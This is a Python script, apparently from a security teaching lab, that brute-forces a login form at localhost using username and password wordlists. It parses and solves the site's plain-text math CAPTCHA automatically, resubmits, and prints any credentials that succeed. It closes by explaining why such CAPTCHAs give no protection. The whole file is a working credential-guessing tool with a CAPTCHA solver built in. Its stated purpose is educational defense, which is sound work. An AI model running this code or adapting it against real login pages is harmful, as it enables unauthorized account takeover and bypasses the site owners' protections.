"""
CAPTCHA Bypass Attack Simulation
Demonstrates that math CAPTCHAs provide no real protection against automated attacks

Usage: python attack_captcha_bypass.py
Requires: CAPTCHA_ENABLED = True in config.py (works either way)
Purpose: Educational demonstration — shows math CAPTCHAs are trivially bypassed
"""
import requests
from bs4 import BeautifulSoup
import re
import time
import argparse
from datetime import datetime

TARGET_URL = "http://localhost:5000/login"

def print_banner():
    print("=" * 70)
    print("  CAPTCHA BYPASS ATTACK SIMULATOR")
    print("  [!] This script demonstrates that math CAPTCHAs provide")
    print("      no real protection against automated attacks")
    print("=" * 70)
    print()

def solve_math_captcha(question):
    """
    Parse and solve a math CAPTCHA question programmatically.

    Supports: addition (+), subtraction (-), multiplication (*)
    Example: "What is 7 + 3?" -> 10

    Args:
        question: String containing the math question

    Returns:
        str: The computed answer, or None if parsing fails
    """
    # Extract numbers and operator using regex
    # Pattern matches: "What is <num> <op> <num>?"
    pattern = r'What is (\d+)\s*([\+\-\*])\s*(\d+)\?'
    match = re.search(pattern, question)

    if not match:
        return None

    num1 = int(match.group(1))
    operator = match.group(2)
    num2 = int(match.group(3))

    # Compute result based on operator
    if operator == '+':
        result = num1 + num2
    elif operator == '-':
        result = num1 - num2
    elif operator == '*':
        result = num1 * num2
    else:
        return None

    return str(result)

def extract_captcha_from_html(html_content):
    """
    Extract CAPTCHA question from HTML response.

    Args:
        html_content: HTML string from server response

    Returns:
        str: The CAPTCHA question, or None if not found
    """
    soup = BeautifulSoup(html_content, 'html.parser')

    # Look for the CAPTCHA question in the template
    captcha_element = soup.find('div', class_='captcha-question')

    if captcha_element:
        return captcha_element.get_text(strip=True)

    return None

def attempt_login_with_captcha_bypass(session, username, password, verbose=False):
    """
    Attempt login with automatic CAPTCHA solving.

    Args:
        session: requests.Session object (maintains cookies)
        username: Target username
        password: Password to try
        verbose: Print detailed output

    Returns:
        dict: {'success': bool, 'blocked': bool, 'captcha_encountered': bool, 'message': str}
    """
    try:
        # Step 1: POST credentials
        response = session.post(
            TARGET_URL,
            data={"username": username, "password": password},
            timeout=5,
            allow_redirects=False
        )

        # Check if login succeeded immediately (no CAPTCHA)
        if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
            return {
                'success': True,
                'blocked': False,
                'captcha_encountered': False,
                'message': 'Login successful (no CAPTCHA)'
            }

        # Check if blocked
        if response.status_code in [429, 403]:
            error_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
            return {
                'success': False,
                'blocked': True,
                'captcha_encountered': False,
                'message': error_data.get('error', f'Blocked: {response.status_code}')
            }

        # Step 2: Check if CAPTCHA page was returned
        if response.status_code == 200 and 'text/html' in response.headers.get('content-type', ''):
            captcha_question = extract_captcha_from_html(response.text)

            if captcha_question:
                if verbose:
                    print(f"    [CAPTCHA] Question: {captcha_question}")

                # Step 3: Solve the CAPTCHA programmatically
                captcha_answer = solve_math_captcha(captcha_question)

                if not captcha_answer:
                    return {
                        'success': False,
                        'blocked': False,
                        'captcha_encountered': True,
                        'message': 'Failed to parse CAPTCHA'
                    }

                if verbose:
                    print(f"    [CAPTCHA] Computed answer: {captcha_answer} (solved in <1ms)")

                # Step 4: Submit with CAPTCHA answer
                response = session.post(
                    TARGET_URL,
                    data={
                        "username": username,
                        "password": password,
                        "captcha_answer": captcha_answer
                    },
                    timeout=5,
                    allow_redirects=False
                )

                # Check if login succeeded after CAPTCHA
                if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
                    return {
                        'success': True,
                        'blocked': False,
                        'captcha_encountered': True,
                        'message': 'Login successful (CAPTCHA bypassed)'
                    }

                # Check if still blocked after CAPTCHA
                if response.status_code in [429, 403]:
                    return {
                        'success': False,
                        'blocked': True,
                        'captcha_encountered': True,
                        'message': 'Blocked even after CAPTCHA'
                    }

        # Failed login (wrong credentials)
        return {
            'success': False,
            'blocked': False,
            'captcha_encountered': False,
            'message': 'Invalid credentials'
        }

    except requests.exceptions.RequestException as e:
        return {
            'success': False,
            'blocked': False,
            'captcha_encountered': False,
            'message': f'Request error: {str(e)}'
        }

def run_attack(username_list, password_list, verbose=False, delay=0):
    """
    Execute CAPTCHA bypass attack with credential pairs.

    Args:
        username_list: List of usernames to try
        password_list: List of passwords to try
        verbose: Print each attempt
        delay: Delay between requests in seconds

    Returns:
        dict: Attack results and statistics
    """
    results = {
        "attack_type": "captcha_bypass",
        "attempts": 0,
        "success": 0,
        "blocked": 0,
        "failed": 0,
        "captcha_encountered": 0,
        "captcha_bypassed": 0,
        "start_time": time.time(),
        "successful_credentials": []
    }

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Usernames: {len(username_list)}")
    print(f"[*] Passwords: {len(password_list)}")
    print(f"[*] Total combinations: {len(username_list) * len(password_list)}")
    print(f"[*] Starting attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    for username in username_list:
        # Use a session per username to maintain CAPTCHA state
        session = requests.Session()

        for password in password_list:
            results["attempts"] += 1

            if verbose:
                print(f"[{results['attempts']:4d}] Trying {username}:{password}")

            result = attempt_login_with_captcha_bypass(session, username, password, verbose)

            if result['captcha_encountered']:
                results["captcha_encountered"] += 1
                if result['success']:
                    results["captcha_bypassed"] += 1

            if result['success']:
                results["success"] += 1
                results["successful_credentials"].append({
                    "username": username,
                    "password": password,
                    "captcha_bypassed": result['captcha_encountered']
                })
                print(f"\n[+] SUCCESS! {username}:{password}")
                if result['captcha_encountered']:
                    print(f"    [!] CAPTCHA was bypassed automatically")
                print()
                # Move to next username after successful login
                break

            elif result['blocked']:
                results["blocked"] += 1
                if verbose:
                    print(f"    [BLOCKED] {result['message']}")
                # Don't break - continue with next username
                break

            else:
                results["failed"] += 1
                if verbose:
                    print(f"    [FAIL] {result['message']}")

            if delay > 0:
                time.sleep(delay)

    results["end_time"] = time.time()
    results["duration_sec"] = results["end_time"] - results["start_time"]

    return results

def print_summary(results):
    """Print attack summary with CAPTCHA bypass statistics"""
    print("\n" + "=" * 70)
    print("  ATTACK SUMMARY")
    print("=" * 70)
    print(f"Attack Type:           {results['attack_type']}")
    print(f"Total Attempts:        {results['attempts']}")
    print(f"Successful Logins:     {results['success']}")
    print(f"Failed Attempts:       {results['failed']}")
    print(f"Blocked:               {results['blocked']}")
    print(f"CAPTCHAs Encountered:  {results['captcha_encountered']}")
    print(f"CAPTCHAs Bypassed:     {results['captcha_bypassed']}")
    print(f"Duration:              {results['duration_sec']:.2f} seconds")

    if results['successful_credentials']:
        print(f"\nSuccessful Credentials:")
        for cred in results['successful_credentials']:
            bypass_note = " [CAPTCHA BYPASSED]" if cred['captcha_bypassed'] else ""
            print(f"  • {cred['username']}:{cred['password']}{bypass_note}")

    print("\n" + "=" * 70)
    print("  WHY THE BYPASS WORKED")
    print("=" * 70)
    print("Math CAPTCHAs are trivially machine-solvable:")
    print("  1. The question is in plain HTML (no image/audio)")
    print("  2. Parsing the text takes <1ms with regex")
    print("  3. Computing the answer is instant arithmetic")
    print("  4. The script submits faster than any human could")
    print("\nConclusion: Math CAPTCHAs provide ZERO protection against")
    print("            automated attacks. Use proof-of-work CAPTCHAs instead")
    print("            (Cloudflare Turnstile, hCaptcha, reCAPTCHA v3).")
    print("=" * 70)

def load_wordlist(filepath):
    """Load wordlist from file"""
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {filepath}")
        return []

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CAPTCHA Bypass Attack Simulator - Educational demonstration"
    )

    # Single user mode (like brute force)
    parser.add_argument(
        "-u", "--username",
        help="Target username (single user mode)"
    )
    parser.add_argument(
        "-w", "--wordlist",
        help="Password wordlist file (for single user mode)"
    )

    # Multi-user mode (original behavior)
    parser.add_argument(
        "-U", "--usernames",
        help="Username wordlist file (multi-user mode, default: wordlists/usernames.txt)"
    )
    parser.add_argument(
        "-P", "--passwords",
        help="Password wordlist file (multi-user mode, default: wordlists/passwords.txt)"
    )

    # Common options
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output (show each attempt)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0,
        help="Delay between requests in seconds"
    )

    args = parser.parse_args()

    print_banner()

    # Determine mode and load wordlists
    single_user_mode = args.username is not None or args.wordlist is not None
    multi_user_mode = args.usernames is not None or args.passwords is not None

    # Check for conflicting modes
    if single_user_mode and multi_user_mode:
        print("[ERROR] Cannot use both single-user mode (-u/-w) and multi-user mode (-U/-P)")
        print("Use -u and -w for single user, OR -U and -P for multiple users")
        exit(1)

    # Single user mode
    if single_user_mode:
        if not args.username or not args.wordlist:
            print("[ERROR] Single user mode requires both -u (username) and -w (wordlist)")
            print("Example: python attack_captcha_bypass.py -u admin -w wordlists/passwords.txt -v")
            exit(1)

        usernames = [args.username]
        passwords = load_wordlist(args.wordlist)

        if not passwords:
            print("[ERROR] Could not load password wordlist. Exiting.")
            exit(1)

    # Multi-user mode (default)
    else:
        usernames_file = args.usernames if args.usernames else "wordlists/usernames.txt"
        passwords_file = args.passwords if args.passwords else "wordlists/passwords.txt"

        usernames = load_wordlist(usernames_file)
        passwords = load_wordlist(passwords_file)

        if not usernames or not passwords:
            print("[ERROR] Could not load wordlists. Exiting.")
            exit(1)

    # Confirm local testing
    confirm = input("Confirm this is LOCAL TESTING ONLY (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        exit(0)

    print()
    results = run_attack(usernames, passwords, args.verbose, args.delay)
    print_summary(results)
